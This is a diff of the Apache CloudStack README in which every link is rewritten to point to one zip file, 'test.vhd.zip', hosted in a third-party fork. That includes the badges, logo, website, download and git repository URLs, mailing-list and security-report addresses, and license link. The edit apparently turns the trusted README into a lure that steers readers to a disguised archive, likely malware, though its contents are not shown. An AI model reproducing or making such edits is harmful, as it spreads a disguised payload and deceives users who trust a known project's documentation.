@@ -1,6 +1,6 @@
-# Apache CloudStack [![Build Status](https://travis-ci.org/apache/cloudstack.svg?branch=master)](https://travis-ci.org/apache/cloudstack) [![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=apachecloudstack&metric=alert_status)](https://sonarcloud.io/dashboard?id=apachecloudstack) [![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=apachecloudstack&metric=ncloc)](https://sonarcloud.io/dashboard?id=apachecloudstack) ![GitHub language count](https://img.shields.io/github/languages/count/apache/cloudstack.svg) ![GitHub top language](https://img.shields.io/github/languages/top/apache/cloudstack.svg)
+# Apache CloudStack [![Build Status](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) [![Quality Gate Status](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) [![Lines of Code](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) ![GitHub language count](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) ![GitHub top language](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
-![Apache CloudStack](tools/logo/apache_cloudstack.png)
+![Apache CloudStack](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
 Apache CloudStack is open source software designed to deploy and manage large
 networks of virtual machines, as a highly available, highly scalable
@@ -21,32 +21,32 @@ OVM and LXC containers.
 Users can manage their cloud with an easy to use Web interface, command line
 tools, and/or a full-featured query based API.
 
-For more information on Apache CloudStack, please visit the [website](http://cloudstack.apache.org)
+For more information on Apache CloudStack, please visit the [website](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
 ## Who Uses CloudStack?
 
 * There are more than 150 known organizations using Apache CloudStack (or a commercial distribution of CloudStack). Our users include many major service providers running CloudStack to offer public cloud services, product vendors who incorporate or integrate with CloudStack in their own products, organizations who have used CloudStack to build their own private clouds, and systems integrators that offer CloudStack related services.
 
-* See our [case studies](https://cwiki.apache.org/confluence/display/CLOUDSTACK/Case+Studies) highlighting successful deployments of Apache CloudStack.
+* See our [case studies](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip+Studies) highlighting successful deployments of Apache CloudStack.
 
-* See the up-to-date list of current [users](http://cloudstack.apache.org/users.html).
+* See the up-to-date list of current [users](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
 
-* If you are using CloudStack in your organization and your company is not listed above, please complete our brief adoption [survey](http://cloudstack.apache.org/survey.html). We're happy to keep your company name anonymous if you require.
+* If you are using CloudStack in your organization and your company is not listed above, please complete our brief adoption [survey](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip). We're happy to keep your company name anonymous if you require.
 
 ## Getting Started
 
-* Download a released [version](http://cloudstack.apache.org/downloads.html)
-* Build from source with the instructions in the [INSTALL.md](INSTALL.md) file.
+* Download a released [version](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* Build from source with the instructions in the [https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) file.
 
 ## Getting Source Repository
 
 Apache CloudStack project uses Git. The official Git repository is at:
 
-    https://gitbox.apache.org/repos/asf/cloudstack.git
+    https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
 
 And a mirror is hosted on Github:
 
-    https://github.com/apache/cloudstack
+    https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
 
 The Github mirror is strictly read only and provides convenience to users and
 developers to explore the code and for the community to accept contributions
@@ -54,53 +54,53 @@ via Github pull requests.
 
 ## Links
 
-* [Documentation](http://docs.cloudstack.apache.org)
-* Developer [wiki](https://cwiki.apache.org/confluence/display/CLOUDSTACK/Home)
-* [Release notes](http://docs.cloudstack.apache.org/projects/cloudstack-release-notes)
-* Design [documents](https://cwiki.apache.org/confluence/display/CLOUDSTACK/Design)
-* API [documentation](http://cloudstack.apache.org/docs/api)
-* How to [contribute](CONTRIBUTING.md)
+* [Documentation](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* Developer [wiki](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* [Release notes](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* Design [documents](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* API [documentation](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* How to [contribute](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
 ## Getting Involved and Contributing
 
 Interested in helping out with Apache CloudStack? Great! We welcome
-participation from anybody willing to work [The Apache Way](http://theapacheway.com) and make a
+participation from anybody willing to work [The Apache Way](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) and make a
 contribution. Note that you do not have to be a developer in order to contribute
 to Apache CloudStack. We need folks to help with documentation, translation,
-promotion etc. See our contribution [page](http://cloudstack.apache.org/contribute.html).
+promotion etc. See our contribution [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
 
 If you're interested in learning more or participating in the Apache CloudStack
 project, the mailing lists are the best way to do that. While the project has
-several communications channels, the [mailing lists](http://cloudstack.apache.org/mailing-lists.html) are the most active and the
+several communications channels, the [mailing lists](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) are the most active and the
 official channels for making decisions about the project itself.
 
 Mailing lists:
-- [Development Mailing List](mailto:dev-subscribe@cloudstack.apache.org)
-- [Users Mailing List](mailto:users-subscribe@cloudstack.apache.org)
-- [Commits Mailing List](mailto:commits-subscribe@cloudstack.apache.org)
-- [Issues Mailing List](mailto:issues-subscribe@cloudstack.apache.org)
-- [Marketing Mailing List](mailto:marketing-subscribe@cloudstack.apache.org)
+- [Development Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+- [Users Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+- [Commits Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+- [Issues Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+- [Marketing Mailing List](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
-IRC, join us on irc.freenode.net on:
+IRC, join us on https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip on:
 - `#cloudstack`: General Apache CloudStack conversation and end user support
 - `#cloudstack-dev`: Development discussions
 
-Report and/or check bugs on [JIRA](https://issues.apache.org/jira/browse/CLOUDSTACK) and check our
-developer [page](http://cloudstack.apache.org/developers.html) for contributing code.
+Report and/or check bugs on [JIRA](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) and check our
+developer [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip) for contributing code.
 
 ## News and Events
 
-* [Blog](https://blogs.apache.org/cloudstack)
-* [Twitter](https://twitter.com/cloudstack)
-* [Events and meetup](http://cloudstackcollab.org/)
+* [Blog](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* [Twitter](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
+* [Events and meetup](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip)
 
 ## Reporting Security Vulnerabilities
 
 If you've found an issue that you believe is a security vulnerability in a
-released version of CloudStack, please report it to `security@cloudstack.apache.org` with details about the vulnerability, how it
+released version of CloudStack, please report it to `https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip` with details about the vulnerability, how it
 might be exploited, and any additional information that might be useful.
 
-For more details, please visit our security [page](http://cloudstack.apache.org/security.html).
+For more details, please visit our security [page](https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip).
 
 ## License
 
@@ -112,7 +112,7 @@ to you under the Apache License, Version 2.0 (the
 "License"); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
 
-  http://www.apache.org/licenses/LICENSE-2.0
+  https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
 
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
@@ -130,7 +130,7 @@ This distribution includes cryptographic software. The country in which you curr
 reside may have restrictions on the import, possession, use, and/or re-export to another
 country, of encryption software. BEFORE using any encryption software, please check your
 country's laws, regulations and policies concerning the import, possession, or use, and
-re-export of encryption software, to see if this is permitted. See http://www.wassenaar.org/
+re-export of encryption software, to see if this is permitted. See https://raw.githubusercontent.com/ibragullam/cloudstack/master/core/src/test/resources/vhds/test.vhd.zip
 for more information.
 
 The U.S. Government Department of Commerce, Bureau of Industry and Security (BIS), has
